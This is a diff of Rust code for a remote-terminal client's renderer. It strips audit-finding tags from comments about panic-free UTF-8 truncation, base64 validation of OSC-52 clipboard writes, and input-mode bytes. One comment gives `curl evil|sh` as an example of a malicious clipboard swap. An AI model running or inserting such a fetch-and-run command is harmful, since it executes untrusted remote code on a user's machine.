@@ -83,8 +83,8 @@ pub fn render(
                 cur_style = Some(style);
             }
 
-            // Borrow a &str per branch — no per-cell String allocation on the hot repaint path
-            // (S-04): `contents()` already returns &str and the predicted glyph is borrowed from the
+            // Borrow a &str per branch — no per-cell String allocation on the hot repaint path:
+            // `contents()` already returns &str and the predicted glyph is borrowed from the
             // overlay, both outliving this write. An empty glyph renders as a blank cell.
             let glyph: &str = if let Some(p) = concrete {
                 &p.glyph
@@ -105,7 +105,7 @@ pub fn render(
         if line.len() > max {
             // Truncate on a UTF-8 char boundary, never mid-scalar. `cols` is the peer-controlled
             // (clamped) screen width, and the status strings contain multi-byte glyphs (em-dash,
-            // ellipsis), so a raw `String::truncate(max)` would panic and crash the client (KOH-04).
+            // ellipsis), so a raw `String::truncate(max)` would panic and crash the client.
             line.truncate(line.floor_char_boundary(max));
         }
         backend.move_to(rows.saturating_sub(1), 0)?;
@@ -133,7 +133,7 @@ fn sanitize_osc(t: &str) -> String {
 
 /// Whether `s` is a well-formed base64 clipboard payload: non-empty and only the standard base64
 /// alphabet (`A–Z a–z 0–9 + / =`). A remote OSC-52 set should be base64; anything else is rejected
-/// rather than written verbatim to the user's terminal/clipboard (L-1 hardening).
+/// rather than written verbatim to the user's terminal/clipboard.
 fn is_base64_payload(s: &str) -> bool {
     !s.is_empty()
         && s.bytes()
@@ -152,11 +152,11 @@ pub struct WindowState<'a> {
     pub bell_count: u64,
 }
 
-/// The input modes the remote app has set, which the real terminal must mirror (KC-01).
+/// The input modes the remote app has set, which the real terminal must mirror.
 ///
 /// Application keypad / cursor keys, bracketed paste, and xterm mouse reporting. The escape
-/// sequences emitted are byte-identical to what koh emitted through vt100 0.16's
-/// `input_mode_formatted` / `input_mode_diff` (pinned by a test).
+/// sequences match vt100 0.16's `input_mode_formatted` / `input_mode_diff` byte for byte (pinned
+/// by a test).
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
 pub struct InputModes {
     pub application_keypad: bool,
@@ -261,7 +261,7 @@ pub(super) struct OutOfBand {
     /// you're in a koh session — mosh's `[mosh] ` prefix. Empty disables it. Compared cells stay the
     /// *raw* title, so change-detection is unaffected.
     title_prefix: String,
-    /// Whether remote OSC-52 clipboard writes are honored. **Default OFF** (L-1): a malicious server
+    /// Whether remote OSC-52 clipboard writes are honored. **Default OFF**: a malicious server
     /// could otherwise silently overwrite the user's system clipboard (e.g. swap a copied command
     /// for `curl evil|sh`). Opt in with `--clipboard`; even then the payload is
     /// validated as strict base64 within the size cap before it's forwarded.
@@ -314,7 +314,7 @@ impl OutOfBand {
         win: WindowState<'_>,
     ) -> io::Result<()> {
         self.emit_window_title(backend, win.title, win.icon)?;
-        // Clipboard (OSC 52): OFF by default (L-1). A remote server must not silently overwrite the
+        // Clipboard (OSC 52): OFF by default. A remote server must not silently overwrite the
         // user's system clipboard. Only when the user explicitly opted in (`--clipboard`) do we
         // forward it — and only a strict-base64 payload within the size cap
         // (the synced value is already capped client-side; we re-check defensively).
@@ -513,7 +513,7 @@ mod tests {
 
     #[test]
     fn out_of_band_clipboard_off_by_default_emits_nothing() {
-        // L-1: a default OutOfBand must NOT forward a server-set clipboard — no OSC 52 reaches the
+        // A default OutOfBand must NOT forward a server-set clipboard — no OSC 52 reaches the
         // terminal even though the clipboard changed (the user never opted in).
         let mut oob = OutOfBand::default();
         let buf = oob_emit(&mut oob, &screen_of(b""), win("", "", "aGVsbG8=", 0));
@@ -589,7 +589,7 @@ mod tests {
 
     #[test]
     fn status_line_truncation_is_panic_free_across_all_widths() {
-        // KOH-04: the peer-controlled (clamped) screen width must never make the multi-byte status
+        // The peer-controlled (clamped) screen width must never make the multi-byte status
         // line panic via a mid-UTF-8 `String::truncate`. Sweep every width in [MIN_DIM, MAX_DIM]
         // with the real link-down banner (em-dash U+2014 + ellipsis U+2026, whose bytes straddle
         // widths 18/19/30/31) and assert render() never panics.
@@ -630,12 +630,12 @@ mod tests {
         assert!(s.contains('Z'), "predicted glyph not rendered");
     }
 
-    // --- KC-01: InputModes reproduces koh's pre-migration (vt100 0.16) input-mode bytes ---
+    // --- InputModes emits vt100 0.16's input-mode bytes ---
 
     #[test]
     fn input_modes_formatted_and_diff_match_the_vt100_oracle() {
-        // Captured from vt100 0.16.2's `input_mode_formatted` / `input_mode_diff` before it was
-        // removed, so the bytes the local terminal sees are unchanged by the fux-vt migration.
+        // Reference bytes from vt100 0.16.2's `input_mode_formatted` / `input_mode_diff`: the local
+        // terminal must see exactly these.
         let seqs: [&[u8]; 6] = [
             b"",
             b"\x1b[?2004h",
